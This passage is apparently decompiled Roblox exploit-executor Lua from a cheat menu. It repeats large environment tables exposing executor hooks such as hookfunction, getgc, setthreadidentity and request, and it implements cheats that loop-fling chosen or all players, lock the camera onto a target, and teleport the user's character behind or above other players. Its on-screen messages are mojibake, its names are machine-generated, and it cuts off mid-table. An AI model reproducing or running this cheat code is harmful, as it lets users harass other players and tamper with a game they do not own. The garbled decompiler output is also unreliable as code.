        Vector3int16 = Vector3int16,
        CFrame = CFrame,
        Color3 = Color3,
        UDim = UDim,
        UDim2 = UDim2,
        Rect = Rect,
        Region3 = Region3,
        Ray = Ray,
        NumberRange = NumberRange,
        NumberSequence = NumberSequence,
        NumberSequenceKeypoint = NumberSequenceKeypoint,
        ColorSequence = ColorSequence,
        ColorSequenceKeypoint = ColorSequenceKeypoint,
        BrickColor = BrickColor,
        TweenInfo = TweenInfo,
        PhysicalProperties = PhysicalProperties,
        Faces = Faces,
        Axes = Axes,
        Random = Random,
        DateTime = DateTime,
        Font = Font,
        OverlapParams = OverlapParams,
        RaycastParams = RaycastParams,
        Enum = Enum,
        wait = wait,
        tick = tick,
        time = time,
        elapsedTime = elapsedTime,
        typeof = typeof,
        warn = warn,
        spawn = spawn,
        delay = delay,
        task = task,
        getgenv = getgenv,
        getrenv = getrenv,
        getsenv = getsenv,
        getreg = getreg,
        getgc = getgc,
        getloadedmodules = getloadedmodules,
        getinstances = getinstances,
        getnilinstances = getnilinstances,
        getscripts = getscripts,
        getconnections = getconnections,
        getrunningscripts = getrunningscripts,
        getcallingscript = getcallingscript,
        gethui = gethui,
        getthreadidentity = getthreadidentity,
        setthreadidentity = setthreadidentity,
        checkcaller = checkcaller,
        islclosure = islclosure,
        iscclosure = iscclosure,
        isourclosure = isourclosure,
        is_synapse_function = is_synapse_function,
        clonefunction = clonefunction,
        cloneref = cloneref,
        compareinstances = compareinstances,
        newcclosure = newcclosure,
        hookfunction = hookfunction,
        replaceclosure = replaceclosure,
        hookmetamethod = hookmetamethod,
        getrawmetatable = getrawmetatable,
        setrawmetatable = setrawmetatable,
        setreadonly = setreadonly,
        isreadonly = isreadonly,
        make_writeable = make_writeable,
        make_readonly = make_readonly,
        identifyexecutor = identifyexecutor,
        getexecutorname = getexecutorname,
        setclipboard = setclipboard,
        toclipboard = toclipboard,
        setfpscap = setfpscap,
        firetouchinterest = firetouchinterest,
        fireclickdetector = fireclickdetector,
        fireproximityprompt = fireproximityprompt,
        keypress = keypress,
        keyrelease = keyrelease,
        mouse1click = mouse1click,
        mouse1press = mouse1press,
        mouse1release = mouse1release,
        mousemoverel = mousemoverel,
        queue_on_teleport = queue_on_teleport,
        saveinstance = saveinstance,
        decompile = decompile,
        getscriptclosure = getscriptclosure,
        getfunctionhash = getfunctionhash,
        getcustomasset = getcustomasset,
        rconsoleprint = rconsoleprint,
        rconsolename = rconsolename,
        rconsoleclear = rconsoleclear,
        setfflag = setfflag,
        protectgui = protectgui,
        unprotectgui = unprotectgui,
        sethiddenproperty = sethiddenproperty,
        gethiddenproperty = gethiddenproperty,
        isnetworkowner = isnetworkowner,
        isfile = isfile,
        isfolder = isfolder,
        makefolder = makefolder,
        delfile = delfile,
        delfolder = delfolder,
        listfiles = listfiles,
        readfile = readfile,
        writefile = writefile,
        appendfile = appendfile,
        loadfile = loadfile,
        dofile = dofile,
        request = request,
        http_request = request,
        crypt = crypt,
        base64_encode = base64_encode,
        base64_decode = base64_decode,
        base64encode = base64_encode,
        base64decode = base64_decode,
        syn = syn,
        WebSocket = WebSocket,
        Drawing = Drawing,
        DrawingImmediate = Drawing,
        }
        Element182._G = Element182
        local Element183 = Element182
        local autofling = Element182.autofling
        if autofling then
            task.wait(0.5)
            Element183 = Element176
            while true do
                if Element183.playernamedied and DisguiseTab:FindFirstChild(Element176.playernamedied) then
                    pcall(Element181, Element176.playernamedied)
                    autofling = getgenv(select(2, ...)).autofling
                    task.wait(0.5)
                    Element183 = Element176
                    continue
                end
                if getgenv(select(3, ...)).autofling then
                    task.wait(0.5)
                    Element183 = Element176
                    continue
                end
                break
            end
            return
        else
            return autofling, Element183
        end
    end
    local Element184
    if Request44 then
        if not Element176.playernamedied then
            Element163("çª", "è¯·åéæ©ç©å®¶", "rbxassetid://71024334944141", 3)
        else
            Element184 = {
            print = print,
            type = type,
            tostring = tostring,
            tonumber = tonumber,
            next = next,
            pairs = pairs,
            ipairs = ipairs,
            select = select,
            rawget = rawget,
            rawset = rawset,
            rawequal = rawequal,
            rawlen = rawlen,
            setmetatable = setmetatable,
            getmetatable = getmetatable,
            assert = assert,
            error = error,
            pcall = pcall,
            xpcall = xpcall,
            unpack = unpack,
            getfenv = getfenv,
            setfenv = setfenv,
            collectgarbage = collectgarbage,
            gcinfo = gcinfo,
            newproxy = newproxy,
            require = require,
            load = load,
            loadstring = load,
            _VERSION = "Lua 5.1",
            string = string,
            table = table,
            math = math,
            bit32 = bit32,
            bit = bit32,
            os = os,
            io = io,
            utf8 = utf8,
            debug = debug,
            coroutine = coroutine,
            buffer = buffer,
            game = game,
            Game = game,
            workspace = workspace,
            Workspace = workspace,
            script = script,
            shared = shared,
            plugin = plugin,
            Instance = Instance,
            Vector2 = Vector2,
            Vector3 = Vector3,
            Vector2int16 = Vector2int16,
            Vector3int16 = Vector3int16,
            CFrame = CFrame,
            Color3 = Color3,
            UDim = UDim,
            UDim2 = UDim2,
            Rect = Rect,
            Region3 = Region3,
            Ray = Ray,
            NumberRange = NumberRange,
            NumberSequence = NumberSequence,
            NumberSequenceKeypoint = NumberSequenceKeypoint,
            ColorSequence = ColorSequence,
            ColorSequenceKeypoint = ColorSequenceKeypoint,
            BrickColor = BrickColor,
            TweenInfo = TweenInfo,
            PhysicalProperties = PhysicalProperties,
            Faces = Faces,
            Axes = Axes,
            Random = Random,
            DateTime = DateTime,
            Font = Font,
            OverlapParams = OverlapParams,
            RaycastParams = RaycastParams,
            Enum = Enum,
            wait = wait,
            tick = tick,
            time = time,
            elapsedTime = elapsedTime,
            typeof = typeof,
            warn = warn,
            spawn = spawn,
            delay = delay,
            task = task,
            getgenv = getgenv,
            getrenv = getrenv,
            getsenv = getsenv,
            getreg = getreg,
            getgc = getgc,
            getloadedmodules = getloadedmodules,
            getinstances = getinstances,
            getnilinstances = getnilinstances,
            getscripts = getscripts,
            getconnections = getconnections,
            getrunningscripts = getrunningscripts,
            getcallingscript = getcallingscript,
            gethui = gethui,
            getthreadidentity = getthreadidentity,
            setthreadidentity = setthreadidentity,
            checkcaller = checkcaller,
            islclosure = islclosure,
            iscclosure = iscclosure,
            isourclosure = isourclosure,
            is_synapse_function = is_synapse_function,
            clonefunction = clonefunction,
            cloneref = cloneref,
            compareinstances = compareinstances,
            newcclosure = newcclosure,
            hookfunction = hookfunction,
            replaceclosure = replaceclosure,
            hookmetamethod = hookmetamethod,
            getrawmetatable = getrawmetatable,
            setrawmetatable = setrawmetatable,
            setreadonly = setreadonly,
            isreadonly = isreadonly,
            make_writeable = make_writeable,
            make_readonly = make_readonly,
            identifyexecutor = identifyexecutor,
            getexecutorname = getexecutorname,
            setclipboard = setclipboard,
            toclipboard = toclipboard,
            setfpscap = setfpscap,
            firetouchinterest = firetouchinterest,
            fireclickdetector = fireclickdetector,
            fireproximityprompt = fireproximityprompt,
            keypress = keypress,
            keyrelease = keyrelease,
            mouse1click = mouse1click,
            mouse1press = mouse1press,
            mouse1release = mouse1release,
            mousemoverel = mousemoverel,
            queue_on_teleport = queue_on_teleport,
            saveinstance = saveinstance,
            decompile = decompile,
            getscriptclosure = getscriptclosure,
            getfunctionhash = getfunctionhash,
            getcustomasset = getcustomasset,
            rconsoleprint = rconsoleprint,
            rconsolename = rconsolename,
            rconsoleclear = rconsoleclear,
            setfflag = setfflag,
            protectgui = protectgui,
            unprotectgui = unprotectgui,
            sethiddenproperty = sethiddenproperty,
            gethiddenproperty = gethiddenproperty,
            isnetworkowner = isnetworkowner,
            isfile = isfile,
            isfolder = isfolder,
            makefolder = makefolder,
            delfile = delfile,
            delfolder = delfolder,
            listfiles = listfiles,
            readfile = readfile,
            writefile = writefile,
            appendfile = appendfile,
            loadfile = loadfile,
            dofile = dofile,
            request = request,
            http_request = request,
            crypt = crypt,
            base64_encode = base64_encode,
            base64_decode = base64_decode,
            base64encode = base64_encode,
            base64decode = base64_decode,
            syn = syn,
            WebSocket = WebSocket,
            Drawing = Drawing,
            DrawingImmediate = Drawing,
            }
            Element184._G = Element184
            Element184.autofling = true
            task.spawn(Job191)
            Element163("çª", "å·²å¼å¯å¾ªç¯ç©é£", "rbxassetid://71024334944141", 3)
        end
        return Request44
    else
        Element184 = {
        print = print,
        type = type,
        tostring = tostring,
        tonumber = tonumber,
        next = next,
        pairs = pairs,
        ipairs = ipairs,
        select = select,
        rawget = rawget,
        rawset = rawset,
        rawequal = rawequal,
        rawlen = rawlen,
        setmetatable = setmetatable,
        getmetatable = getmetatable,
        assert = assert,
        error = error,
        pcall = pcall,
        xpcall = xpcall,
        unpack = unpack,
        getfenv = getfenv,
        setfenv = setfenv,
        collectgarbage = collectgarbage,
        gcinfo = gcinfo,
        newproxy = newproxy,
        require = require,
        load = load,
        loadstring = load,
        _VERSION = "Lua 5.1",
        string = string,
        table = table,
        math = math,
        bit32 = bit32,
        bit = bit32,
        os = os,
        io = io,
        utf8 = utf8,
        debug = debug,
        coroutine = coroutine,
        buffer = buffer,
        game = game,
        Game = game,
        workspace = workspace,
        Workspace = workspace,
        script = script,
        shared = shared,
        plugin = plugin,
        Instance = Instance,
        Vector2 = Vector2,
        Vector3 = Vector3,
        Vector2int16 = Vector2int16,
        Vector3int16 = Vector3int16,
        CFrame = CFrame,
        Color3 = Color3,
        UDim = UDim,
        UDim2 = UDim2,
        Rect = Rect,
        Region3 = Region3,
        Ray = Ray,
        NumberRange = NumberRange,
        NumberSequence = NumberSequence,
        NumberSequenceKeypoint = NumberSequenceKeypoint,
        ColorSequence = ColorSequence,
        ColorSequenceKeypoint = ColorSequenceKeypoint,
        BrickColor = BrickColor,
        TweenInfo = TweenInfo,
        PhysicalProperties = PhysicalProperties,
        Faces = Faces,
        Axes = Axes,
        Random = Random,
        DateTime = DateTime,
        Font = Font,
        OverlapParams = OverlapParams,
        RaycastParams = RaycastParams,
        Enum = Enum,
        wait = wait,
        tick = tick,
        time = time,
        elapsedTime = elapsedTime,
        typeof = typeof,
        warn = warn,
        spawn = spawn,
        delay = delay,
        task = task,
        getgenv = getgenv,
        getrenv = getrenv,
        getsenv = getsenv,
        getreg = getreg,
        getgc = getgc,
        getloadedmodules = getloadedmodules,
        getinstances = getinstances,
        getnilinstances = getnilinstances,
        getscripts = getscripts,
        getconnections = getconnections,
        getrunningscripts = getrunningscripts,
        getcallingscript = getcallingscript,
        gethui = gethui,
        getthreadidentity = getthreadidentity,
        setthreadidentity = setthreadidentity,
        checkcaller = checkcaller,
        islclosure = islclosure,
        iscclosure = iscclosure,
        isourclosure = isourclosure,
        is_synapse_function = is_synapse_function,
        clonefunction = clonefunction,
        cloneref = cloneref,
        compareinstances = compareinstances,
        newcclosure = newcclosure,
        hookfunction = hookfunction,
        replaceclosure = replaceclosure,
        hookmetamethod = hookmetamethod,
        getrawmetatable = getrawmetatable,
        setrawmetatable = setrawmetatable,
        setreadonly = setreadonly,
        isreadonly = isreadonly,
        make_writeable = make_writeable,
        make_readonly = make_readonly,
        identifyexecutor = identifyexecutor,
        getexecutorname = getexecutorname,
        setclipboard = setclipboard,
        toclipboard = toclipboard,
        setfpscap = setfpscap,
        firetouchinterest = firetouchinterest,
        fireclickdetector = fireclickdetector,
        fireproximityprompt = fireproximityprompt,
        keypress = keypress,
        keyrelease = keyrelease,
        mouse1click = mouse1click,
        mouse1press = mouse1press,
        mouse1release = mouse1release,
        mousemoverel = mousemoverel,
        queue_on_teleport = queue_on_teleport,
        saveinstance = saveinstance,
        decompile = decompile,
        getscriptclosure = getscriptclosure,
        getfunctionhash = getfunctionhash,
        getcustomasset = getcustomasset,
        rconsoleprint = rconsoleprint,
        rconsolename = rconsolename,
        rconsoleclear = rconsoleclear,
        setfflag = setfflag,
        protectgui = protectgui,
        unprotectgui = unprotectgui,
        sethiddenproperty = sethiddenproperty,
        gethiddenproperty = gethiddenproperty,
        isnetworkowner = isnetworkowner,
        isfile = isfile,
        isfolder = isfolder,
        makefolder = makefolder,
        delfile = delfile,
        delfolder = delfolder,
        listfiles = listfiles,
        readfile = readfile,
        writefile = writefile,
        appendfile = appendfile,
        loadfile = loadfile,
        dofile = dofile,
        request = request,
        http_request = request,
        crypt = crypt,
        base64_encode = base64_encode,
        base64_decode = base64_decode,
        base64encode = base64_encode,
        base64decode = base64_decode,
        syn = syn,
        WebSocket = WebSocket,
        Drawing = Drawing,
        DrawingImmediate = Drawing,
        }
        Element184._G = Element184
        Element184.autofling = false
        Element163("çª", "å·²å³é­å¾ªç¯ç©é£", "rbxassetid://71024334944141", 3)
    end
    return Request44
end

local function Job192()
    Element181("all")
    Element163("çª", "å·²ç©é£ææäºº", "rbxassetid://71024334944141", 3)
end

local function Job193(Request45)
    local function Job194(...)
        local Element185 = x13
        local Camera3 = x13.TD
        local HumanoidRootPart12, Position3, Element186, Element187, Position4
        if Camera3 then
            task.wait()
            Camera3 = Startergui2.CurrentCamera
            Element185 = Element176.playernamedied and DisguiseTab:FindFirstChild(Element176.playernamedied)
            HumanoidRootPart12 = Element185 and Element185.Character and Element185.Character:FindFirstChild("HumanoidRootPart")
            if HumanoidRootPart12 and Camera3 then
                Position3 = Camera3.CFrame.Position
                Position4 = Camera3.CFrame.Position
                Element187 = (HumanoidRootPart12.Position -Position4).unit
                Element186 = Camera3.CFrame.Position + Element187
                Camera3.CFrame = CFrame.new(Position3, Element186)
            else
                getgenv(select(5, ...)).TD = false
            end
            Camera3 = getgenv(select(3, ...)).TD
            task.wait(select(2, ...))
            Element185 = Startergui2
            while true do
                Camera3 = Element185.CurrentCamera
                Element185 = Element176.playernamedied and DisguiseTab:FindFirstChild(Element176.playernamedied)
                HumanoidRootPart12 = Element185 and Element185.Character and Element185.Character:FindFirstChild("HumanoidRootPart")
                if HumanoidRootPart12 and Camera3 then
                    Position3 = Camera3.CFrame.Position
                    Position4 = Camera3.CFrame.Position
                    Element187 = (HumanoidRootPart12.Position -Position4).unit
                    Element186 = Camera3.CFrame.Position + Element187
                    Camera3.CFrame = CFrame.new(Position3, Element186)
                else
                    getgenv(select(5, ...)).TD = false
                end
                if getgenv(select(3, ...)).TD then
                    task.wait(select(2, ...))
                    Element185 = Startergui2
                    continue
                end
                break
            end
            return
        else
            return Camera3, Element185
        end
    end
    local Element188
    if Request45 then
        Element188 = {
        print = print,
        type = type,
        tostring = tostring,
        tonumber = tonumber,
        next = next,
        pairs = pairs,
        ipairs = ipairs,
        select = select,
        rawget = rawget,
        rawset = rawset,
        rawequal = rawequal,
        rawlen = rawlen,
        setmetatable = setmetatable,
        getmetatable = getmetatable,
        assert = assert,
        error = error,
        pcall = pcall,
        xpcall = xpcall,
        unpack = unpack,
        getfenv = getfenv,
        setfenv = setfenv,
        collectgarbage = collectgarbage,
        gcinfo = gcinfo,
        newproxy = newproxy,
        require = require,
        load = load,
        loadstring = load,
        _VERSION = "Lua 5.1",
        string = string,
        table = table,
        math = math,
        bit32 = bit32,
        bit = bit32,
        os = os,
        io = io,
        utf8 = utf8,
        debug = debug,
        coroutine = coroutine,
        buffer = buffer,
        game = game,
        Game = game,
        workspace = workspace,
        Workspace = workspace,
        script = script,
        shared = shared,
        plugin = plugin,
        Instance = Instance,
        Vector2 = Vector2,
        Vector3 = Vector3,
        Vector2int16 = Vector2int16,
        Vector3int16 = Vector3int16,
        CFrame = CFrame,
        Color3 = Color3,
        UDim = UDim,
        UDim2 = UDim2,
        Rect = Rect,
        Region3 = Region3,
        Ray = Ray,
        NumberRange = NumberRange,
        NumberSequence = NumberSequence,
        NumberSequenceKeypoint = NumberSequenceKeypoint,
        ColorSequence = ColorSequence,
        ColorSequenceKeypoint = ColorSequenceKeypoint,
        BrickColor = BrickColor,
        TweenInfo = TweenInfo,
        PhysicalProperties = PhysicalProperties,
        Faces = Faces,
        Axes = Axes,
        Random = Random,
        DateTime = DateTime,
        Font = Font,
        OverlapParams = OverlapParams,
        RaycastParams = RaycastParams,
        Enum = Enum,
        wait = wait,
        tick = tick,
        time = time,
        elapsedTime = elapsedTime,
        typeof = typeof,
        warn = warn,
        spawn = spawn,
        delay = delay,
        task = task,
        getgenv = getgenv,
        getrenv = getrenv,
        getsenv = getsenv,
        getreg = getreg,
        getgc = getgc,
        getloadedmodules = getloadedmodules,
        getinstances = getinstances,
        getnilinstances = getnilinstances,
        getscripts = getscripts,
        getconnections = getconnections,
        getrunningscripts = getrunningscripts,
        getcallingscript = getcallingscript,
        gethui = gethui,
        getthreadidentity = getthreadidentity,
        setthreadidentity = setthreadidentity,
        checkcaller = checkcaller,
        islclosure = islclosure,
        iscclosure = iscclosure,
        isourclosure = isourclosure,
        is_synapse_function = is_synapse_function,
        clonefunction = clonefunction,
        cloneref = cloneref,
        compareinstances = compareinstances,
        newcclosure = newcclosure,
        hookfunction = hookfunction,
        replaceclosure = replaceclosure,
        hookmetamethod = hookmetamethod,
        getrawmetatable = getrawmetatable,
        setrawmetatable = setrawmetatable,
        setreadonly = setreadonly,
        isreadonly = isreadonly,
        make_writeable = make_writeable,
        make_readonly = make_readonly,
        identifyexecutor = identifyexecutor,
        getexecutorname = getexecutorname,
        setclipboard = setclipboard,
        toclipboard = toclipboard,
        setfpscap = setfpscap,
        firetouchinterest = firetouchinterest,
        fireclickdetector = fireclickdetector,
        fireproximityprompt = fireproximityprompt,
        keypress = keypress,
        keyrelease = keyrelease,
        mouse1click = mouse1click,
        mouse1press = mouse1press,
        mouse1release = mouse1release,
        mousemoverel = mousemoverel,
        queue_on_teleport = queue_on_teleport,
        saveinstance = saveinstance,
        decompile = decompile,
        getscriptclosure = getscriptclosure,
        getfunctionhash = getfunctionhash,
        getcustomasset = getcustomasset,
        rconsoleprint = rconsoleprint,
        rconsolename = rconsolename,
        rconsoleclear = rconsoleclear,
        setfflag = setfflag,
        protectgui = protectgui,
        unprotectgui = unprotectgui,
        sethiddenproperty = sethiddenproperty,
        gethiddenproperty = gethiddenproperty,
        isnetworkowner = isnetworkowner,
        isfile = isfile,
        isfolder = isfolder,
        makefolder = makefolder,
        delfile = delfile,
        delfolder = delfolder,
        listfiles = listfiles,
        readfile = readfile,
        writefile = writefile,
        appendfile = appendfile,
        loadfile = loadfile,
        dofile = dofile,
        request = request,
        http_request = request,
        crypt = crypt,
        base64_encode = base64_encode,
        base64_decode = base64_decode,
        base64encode = base64_encode,
        base64decode = base64_decode,
        syn = syn,
        WebSocket = WebSocket,
        Drawing = Drawing,
        DrawingImmediate = Drawing,
        }
        Element188._G = Element188
        Element188.TD = true
        task.spawn(Job194)
        return Request45
    else
        getgenv().TD = false
        return
    end
end

local Button
local function getPlayers6()
    table.clear(Button)
    DisguiseTab:GetPlayers()
    local Element189
    local Element190 = ipairs(Element189)
    local Pack23 = table.pack(Element190(Element189, 0))
    local Unpacked41 = table.unpack(Pack23, 1, Pack23.Pack22)
    local Element191
    if not (Unpacked41 == nil) then
        Element191 = Unpacked41
        while true do
            table.insert(Button, Pack23[2].Name)
            Pack23 = table.pack(Element190(Element189, Element191))
            Unpacked41 = table.unpack(Pack23, 1, Pack23.Pack22)
            if Unpacked41 ~= nil then
                Element191 = Unpacked41
                continue
            end
            break
        end
    end
    Element191 = Unpacked41
    Element190 = #Button
    if Element190 == 0 then
        table.insert(Button, "æ å¨çº¿ç©å®¶")
        return
    else
        return Element190, 0, Element191, table.unpack(Pack23, 1, Pack23.Pack22)
    end
end

local Workspace
local function Job195(Request46)
    Workspace = Request46
end

local Element192, Element193
local function Job196()
    Element192()
    Element193:Refresh(Button)
end

local Element194
local function Job197(Request47)
    Element194 = Request47
end

local RunService, Connection
local function Job198(Request48)
    local Disconnect, Character19
    local function Job199(Request49)
        Character19 = Character19 + Request49
        local Character20, Element195
        if 0.01 <= Character19 then
            Character19 = 0
            if Runservice5.Character and Runservice5.Character:FindFirstChild("HumanoidRootPart") and Disconnect.Character and Disconnect.Character:FindFirstChild("HumanoidRootPart") then
                Character20 = Disconnect.Character.HumanoidRootPart
                Element195 = CFrame.new
                Runservice5.Character.HumanoidRootPart.CFrame = Element195((Character20.CFrame * CFrame.new(0, 0,-Element194)).Position, Character20.Position)
            end
        end
    end
    if Request48 then
        Disconnect = Workspace
        if Disconnect then
            Character19 = DisguiseTab
            Disconnect = DisguiseTab:FindFirstChild(Workspace)
        end
        Character19 = not Disconnect or not Disconnect.Character
        if Character19 then
            Character19 = Element163
            Element163("çª", "ç©å®¶æè§è²ä¸å­å¨", "rbxassetid://71024334944141", 3)
            return Request48, Disconnect
        else
            Character19 = 0
            Connection = RunService.Heartbeat:Connect(Job199)
            return
        end
    else
        Disconnect = Connection
        if Disconnect then
            Character19 = Connection
            Disconnect = Connection.Disconnect
            Disconnect(Connection)
            Connection = nil
        end
        Disconnect = Element163
        Character19 = "çª"
        Element163("çª", "å·²åæ­¢å¾ªç¯ä¼ éè³ç©å®¶åæ¹", "rbxassetid://71024334944141", 3)
        return Request48
    end
end

local Element196
local function Job200(Request50)
    Element196 = Request50
end

local function Job201(Request51)
    local Disconnect2, Character21
    local function Job202(Request52)
        Character21 = Character21 + Request52
        local Character22
        if 0.01 <= Character21 then
            Character21 = 0
            if Runservice5.Character and Runservice5.Character:FindFirstChild("HumanoidRootPart") and Disconnect2.Character and Disconnect2.Character:FindFirstChild("HumanoidRootPart") then
                Character22 = Disconnect2.Character.HumanoidRootPart.CFrame
                Runservice5.Character.HumanoidRootPart.CFrame = Character22 * CFrame.new(0, Element196, 0)
            end
        end
    end
    if Request51 then
        Disconnect2 = Workspace
        if Disconnect2 then
            Character21 = DisguiseTab
            Disconnect2 = DisguiseTab:FindFirstChild(Workspace)
        end
        Character21 = not Disconnect2 or not Disconnect2.Character
        if Character21 then
            Character21 = Element163
            Element163("çª", "ç©å®¶æè§è²ä¸å­å¨", "rbxassetid://71024334944141", 3)
            return Request51, Disconnect2
        else
            Character21 = 0
            Connection = RunService.Heartbeat:Connect(Job202)
            return
        end
    else
        Disconnect2 = Connection
        if Disconnect2 then
            Character21 = Connection
            Disconnect2 = Connection.Disconnect
            Disconnect2(Connection)
            Connection = nil
        end
        Disconnect2 = Element163
        Character21 = "çª"
        Element163("çª", "å·²åæ­¢å¾ªç¯ä¼ éè³ç©å®¶å¤´é¡¶", "rbxassetid://71024334944141", 3)
        return Request51
    end
end

local function Job203(Request53)
    Element194 = Request53
end

local function Job204(Request54)
    local Disconnect3, Character23
    local function Job205(Request55)
        Character23 = Character23 + Request55
        local Character24, Character25, Element197, position5, LookVector
        if 0.01 <= Character23 then
            Character23 = 0
            if Runservice5.Character and Runservice5.Character:FindFirstChild("HumanoidRootPart") and Disconnect3.Character and Disconnect3.Character:FindFirstChild("HumanoidRootPart") then
                Character24 = Disconnect3.Character.HumanoidRootPart
                Character25 = Runservice5.Character.HumanoidRootPart
                Element197 = CFrame.new
                position5 = (Character24.CFrame * CFrame.new(0, 0, Element194)).Position
                LookVector = Character24.CFrame.LookVector
                Character25.CFrame = Element197(position5, Character24.Position -LookVector)
            end
        end
    end
    if Request54 then
        Disconnect3 = Workspace
        if Disconnect3 then
            Character23 = DisguiseTab
            Disconnect3 = DisguiseTab:FindFirstChild(Workspace)
        end
        Character23 = not Disconnect3 or not Disconnect3.Character
        if Character23 then
            Character23 = Element163
            Element163("çª", "ç©å®¶æè§è²ä¸å­å¨", "rbxassetid://71024334944141", 3)
            return Request54, Disconnect3
        else
            Character23 = 0
            Connection = RunService.Heartbeat:Connect(Job205)
            return
        end
    else
        Disconnect3 = Connection
        if Disconnect3 then
            Character23 = Connection
            Disconnect3 = Connection.Disconnect
            Disconnect3(Connection)
            Connection = nil
        end
        Disconnect3 = Element163
        Character23 = "çª"
        Element163("çª", "å·²åæ­¢å¾ªç¯", "rbxassetid://71024334944141", 3)
        return Request54
    end
end

local function Job206(orbitRadius)
    local Element198 = {
    print = print,
    type = type,
    tostring = tostring,
    tonumber = tonumber,
    next = next,
    pairs = pairs,
    ipairs = ipairs,
    select = select,
    rawget = rawget,
    rawset = rawset,
    rawequal = rawequal,
    rawlen = rawlen,
    setmetatable = setmetatable,
    getmetatable = getmetatable,
    assert = assert,
    error = error,
    pcall = pcall,
    xpcall = xpcall,
    unpack = unpack,
    getfenv = getfenv,
    setfenv = setfenv,
    collectgarbage = collectgarbage,
    gcinfo = gcinfo,
    newproxy = newproxy,
    require = require,
    load = load,
    loadstring = load,
    _VERSION = "Lua 5.1",
    string = string,
    table = table,
    math = math,
    bit32 = bit32,
    bit = bit32,
    os = os,
    io = io,
    utf8 = utf8,
    debug = debug,
    coroutine = coroutine,
    buffer = buffer,
    game = game,
    Game = game,
    workspace = workspace,
    Workspace = workspace,
    script = script,
    shared = shared,
    plugin = plugin,
    Instance = Instance,
    Vector2 = Vector2,
    Vector3 = Vector3,
    Vector2int16 = Vector2int16,
    Vector3int16 = Vector3int16,
    CFrame = CFrame,
    Color3 = Color3,
    UDim = UDim,
    UDim2 = UDim2,
    Rect = Rect,
    Region3 = Region3,
    Ray = Ray,
    NumberRange = NumberRange,
    NumberSequence = NumberSequence,
    NumberSequenceKeypoint = NumberSequenceKeypoint,
    ColorSequence = ColorSequence,
    ColorSequenceKeypoint = ColorSequenceKeypoint,
    BrickColor = BrickColor,
    TweenInfo = TweenInfo,
    PhysicalProperties = PhysicalProperties,
    Faces = Faces,
    Axes = Axes,
    Random = Random,
    DateTime = DateTime,
    Font = Font,
    OverlapParams = OverlapParams,
    RaycastParams = RaycastParams,
    Enum = Enum,
    wait = wait,
    tick = tick,
    time = time,
    elapsedTime = elapsedTime,
    typeof = typeof,
    warn = warn,
    spawn = spawn,
    delay = delay,
    task = task,
    getgenv = getgenv,
    getrenv = getrenv,
    getsenv = getsenv,
    getreg = getreg,
    getgc = getgc,
    getloadedmodules = getloadedmodules,
    getinstances = getinstances,
    getnilinstances = getnilinstances,
    getscripts = getscripts,
    getconnections = getconnections,
    getrunningscripts = getrunningscripts,
    getcallingscript = getcallingscript,
    gethui = gethui,
    getthreadidentity = getthreadidentity,
    setthreadidentity = setthreadidentity,
    checkcaller = checkcaller,
    islclosure = islclosure,
    iscclosure = iscclosure,
    isourclosure = isourclosure,
    is_synapse_function = is_synapse_function,
    clonefunction = clonefunction,
    cloneref = cloneref,
    compareinstances = compareinstances,
    newcclosure = newcclosure,
    hookfunction = hookfunction,
    replaceclosure = replaceclosure,
    hookmetamethod = hookmetamethod,
    getrawmetatable = getrawmetatable,
    setrawmetatable = setrawmetatable,
    setreadonly = setreadonly,
    isreadonly = isreadonly,
    make_writeable = make_writeable,
    make_readonly = make_readonly,
    identifyexecutor = identifyexecutor,
    getexecutorname = getexecutorname,
    setclipboard = setclipboard,
    toclipboard = toclipboard,
    setfpscap = setfpscap,
    firetouchinterest = firetouchinterest,
    fireclickdetector = fireclickdetector,
    fireproximityprompt = fireproximityprompt,
    keypress = keypress,
    keyrelease = keyrelease,
    mouse1click = mouse1click,
    mouse1press = mouse1press,
    mouse1release = mouse1release,
    mousemoverel = mousemoverel,
    queue_on_teleport = queue_on_teleport,
    saveinstance = saveinstance,
    decompile = decompile,
    getscriptclosure = getscriptclosure,
    getfunctionhash = getfunctionhash,
    getcustomasset = getcustomasset,
    rconsoleprint = rconsoleprint,
    rconsolename = rconsolename,
    rconsoleclear = rconsoleclear,
    setfflag = setfflag,
    protectgui = protectgui,
    unprotectgui = unprotectgui,
    sethiddenproperty = sethiddenproperty,
    gethiddenproperty = gethiddenproperty,
    isnetworkowner = isnetworkowner,
    isfile = isfile,
    isfolder = isfolder,
    makefolder = makefolder,
    delfile = delfile,
    delfolder = delfolder,
    listfiles = listfiles,
    readfile = readfile,
    writefile = writefile,
    appendfile = appendfile,
    loadfile = loadfile,
    dofile = dofile,
    request = request,
    http_request = request,
    crypt = crypt,
    base64_encode = base64_encode,
    base64_decode = base64_decode,
    base64encode = base64_encode,
    base64decode = base64_decode,
    syn = syn,
    WebSocket = WebSocket,
    Drawing = Drawing,
    DrawingImmediate = Drawing,
    }
    Element198._G = Element198
    Element198.OrbitRadius = orbitRadius
    return orbitRadius, Element198
end

local function Job207(Request56)
    x14.OrbitSpeed = Request56 / 10
    return Request56, x14
end

local function Job208(orbitHeight)
    x14.OrbitHeight = orbitHeight
    return orbitHeight, x14
end

local function Job209(Request57, ...)
    local Players
    local function Job210(...)
        local LocalPlayer18 = game.Players.LocalPlayer
        local Element199 = {
        print = print,
        type = type,
        tostring = tostring,
        tonumber = tonumber,
        next = next,
        pairs = pairs,
        ipairs = ipairs,
        select = select,
        rawget = rawget,
        rawset = rawset,
        rawequal = rawequal,
        rawlen = rawlen,
        setmetatable = setmetatable,
        getmetatable = getmetatable,
        assert = assert,
        error = error,
        pcall = pcall,
        xpcall = xpcall,
        unpack = unpack,
        getfenv = getfenv,
        setfenv = setfenv,
        collectgarbage = collectgarbage,
        gcinfo = gcinfo,
        newproxy = newproxy,
        require = require,
        load = load,
        loadstring = load,
        _VERSION = "Lua 5.1",
        string = string,
        table = table,
        math = math,
        bit32 = bit32,
        bit = bit32,
        os = os,
        io = io,
        utf8 = utf8,
        debug = debug,
        coroutine = coroutine,
        buffer = buffer,
        game = game,
        Game = game,
        workspace = workspace,
        Workspace = workspace,
        script = script,
        shared = shared,
        plugin = plugin,
        Instance = Instance,
        Vector2 = Vector2,
        Vector3 = Vector3,
        Vector2int16 = Vector2int16,
        Vector3int16 = Vector3int16,
        CFrame = CFrame,
        Color3 = Color3,
        UDim = UDim,
        UDim2 = UDim2,
        Rect = Rect,
        Region3 = Region3,
        Ray = Ray,
        NumberRange = NumberRange,
        NumberSequence = NumberSequence,
        NumberSequenceKeypoint = NumberSequenceKeypoint,
        ColorSequence = ColorSequence,
        ColorSequenceKeypoint = ColorSequenceKeypoint,
        BrickColor = BrickColor,
        TweenInfo = TweenInfo,
        PhysicalProperties = PhysicalProperties,
        Faces = Faces,
